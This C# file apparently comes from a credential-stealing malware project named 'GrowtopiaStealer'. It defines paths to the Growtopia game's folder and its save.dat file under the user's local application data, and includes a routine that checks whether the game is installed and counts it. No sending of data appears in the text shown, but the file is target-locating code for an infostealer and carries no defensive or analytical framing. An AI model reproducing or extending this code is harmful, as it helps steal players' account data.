using System;
using System.IO;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
{
    class Growtopia
    {
        #region Growtopia Paths
        // Growtopia folder path
        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia";
        // Growtopia save.dat path
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
        #endregion
        public static void GrowtopiaExistOrNo()
        {
                DirectoryInfo growtopia = new DirectoryInfo(Path.Combine(dirPath));
            // Stop if not exists
            if (!growtopia.Exists)
                return;
        Counting.Growtopia++;
        }
    }
}